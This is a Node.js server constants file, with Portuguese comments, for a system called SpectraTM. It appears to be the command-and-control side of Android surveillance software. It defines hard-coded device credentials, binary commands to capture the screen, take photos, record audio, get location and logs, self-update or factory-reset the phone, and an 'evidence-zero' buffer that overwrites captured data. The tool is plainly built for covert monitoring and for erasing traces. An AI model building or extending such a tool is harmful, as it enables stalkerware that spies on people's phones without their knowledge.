// SpectraTM Server Constants - Gerado pelo bootstrap.sh
const crypto = require('crypto');

class ServerConstants {
    
    // DEVICE ID E TOKEN FIXOS (devem coincidir com Android)
    static DEVICE_ID_FIXED = "f47ac10b58cc4372a2c5";
    static TOKEN_FIXED = "spec2024";
    
    // PAYLOAD DE 256 BYTES PARA VALIDAÇÃO
    static PAYLOAD_256_HEX = "f47ac10b58cc4372a2c5a0e0e4f0b14ad47ac10b58cc4372a2c5a0e0e4f0b14ad47ac10b58cc4372a2c5a0e0e4f0b14ad47ac10b58cc4372a2c5a0e0e4f0b14ad47ac10b58cc4372a2c5a0e0e4f0b14ad47ac10b58cc4372a2c5a0e0e4f0b14ad47ac10b58cc4372a2c5a0e0e4f0b14ad47ac10b58cc4372a2c5a0e0e4f0b14ad47ac10b58cc4372a2c5a0e0e4f0b14ad";
    
    // CONFIGURAÇÕES DE SEGURANÇA
    static KEY_ROTATION_INTERVAL_MS = 5 * 60 * 1000; // 5 minutos
    static CIRCULAR_BUFFER_SIZE = 1024 * 1024; // 1MB
    static MAX_EVIDENCE_AGE_MS = 10 * 60 * 1000; // 10 minutos
    static SESSION_TIMEOUT_MS = 30 * 60 * 1000; // 30 minutos
    
    // COMANDOS BINÁRIOS (deve coincidir com Android)
    static BINARY_COMMANDS = {
        START_SCREEN: 0x01,
        STOP_SCREEN: 0x02,
        CAPTURE_PHOTO: 0x03,
        RECORD_AUDIO: 0x04,
        GET_LOCATION: 0x05,
        GET_LOGS: 0x06,
        SELF_UPDATE: 0x07,
        FACTORY_RESET: 0x08
    };
    
    // MAGIC STRINGS
    static MAGIC_UPDATE = "SPECTRA_UPDATE_v2.0";
    static MAGIC_RESET = "SPECTRA_FACTORY_RESET_v2.0";
    
    // URLs E ENDPOINTS
    static ENDPOINTS = {
        WEBSOCKET: "/live",
        API_BASE: "/api",
        DASHBOARD: "/dashboard",
        DEPLOY: "/deploy",
        UPLOAD: "/upload",
        DOWNLOAD: "/download"
    };
    
    // HELPER METHODS
    static getPayloadBytes() {
        return Buffer.from(this.PAYLOAD_256_HEX, 'hex');
    }
    
    static validatePayload(receivedBuffer) {
        const expected = this.getPayloadBytes();
        return Buffer.compare(receivedBuffer, expected) === 0;
    }
    
    static generateDeviceFingerprint(additionalInfo = '') {
        const baseString = this.DEVICE_ID_FIXED + '_' + this.TOKEN_FIXED + '_' + additionalInfo;
        return crypto.createHash('sha256').update(baseString).digest('hex').substring(0, 16);
    }
    
    static validateDeviceAuth(deviceId, token) {
        return deviceId === this.DEVICE_ID_FIXED && token === this.TOKEN_FIXED;
    }
    
    static createAuthChallenge() {
        const timestamp = Date.now();
        const nonce = crypto.randomBytes(16).toString('hex');
        const challenge = crypto.createHash('sha256')
            .update(this.DEVICE_ID_FIXED + this.TOKEN_FIXED + timestamp + nonce)
            .digest('hex');
            
        return {
            timestamp,
            nonce,
            challenge,
            expiresAt: timestamp + 60000 // 1 minuto
        };
    }
    
    static validateAuthResponse(challenge, response, deviceId) {
        if (Date.now() > challenge.expiresAt) return false;
        if (deviceId !== this.DEVICE_ID_FIXED) return false;
        
        const expectedResponse = crypto.createHash('sha256')
            .update(challenge.challenge + this.TOKEN_FIXED + deviceId)
            .digest('hex');
            
        return response === expectedResponse;
    }
    
    static createBinaryCommand(command, params = {}) {
        const buffer = Buffer.alloc(4);
        buffer[0] = command;
        buffer[1] = params.duration || 0;
        buffer[2] = params.quality || 0;
        buffer[3] = params.flags || 0;
        return buffer;
    }
    
    static parseBinaryCommand(buffer) {
        if (buffer.length < 4) return null;
        
        return {
            command: buffer[0],
            duration: buffer[1],
            quality: buffer[2],
            flags: buffer[3],
            commandName: Object.keys(this.BINARY_COMMANDS).find(
                key => this.BINARY_COMMANDS[key] === buffer[0]
            ) || 'UNKNOWN'
        };
    }
    
    // LOGGING E DEBUG
    static log(level, message, metadata = {}) {
        const timestamp = new Date().toISOString();
        const logEntry = {
            timestamp,
            level,
            message,
            deviceId: metadata.deviceId || 'server',
            ...metadata
        };
        
        console.log(`[${timestamp}] ${level.toUpperCase()}: ${message}`, 
                   metadata.deviceId ? `(${metadata.deviceId})` : '');
        
        return logEntry;
    }
    
    // CIRCULAR BUFFER PARA EVIDENCE-ZERO
    static createCircularBuffer(maxSize = this.CIRCULAR_BUFFER_SIZE) {
        return {
            buffer: Buffer.alloc(maxSize),
            position: 0,
            maxSize: maxSize,
            
            write(data) {
                const dataBuffer = Buffer.isBuffer(data) ? data : Buffer.from(data);
                const remainingSpace = this.maxSize - this.position;
                
                if (dataBuffer.length <= remainingSpace) {
                    dataBuffer.copy(this.buffer, this.position);
                    this.position += dataBuffer.length;
                } else {
                    // Wrap around - overwrite old data
                    const firstPart = remainingSpace;
                    const secondPart = dataBuffer.length - firstPart;
                    
                    dataBuffer.copy(this.buffer, this.position, 0, firstPart);
                    dataBuffer.copy(this.buffer, 0, firstPart, firstPart + secondPart);
                    this.position = secondPart;
                }
            },
            
            clear() {
                this.buffer.fill(0);
                this.position = 0;
            },
            
            getUsage() {
                return {
                    used: this.position,
                    free: this.maxSize - this.position,
                    total: this.maxSize,
                    percentage: Math.round((this.position / this.maxSize) * 100)
                };
            }
        };
    }
}

module.exports = ServerConstants;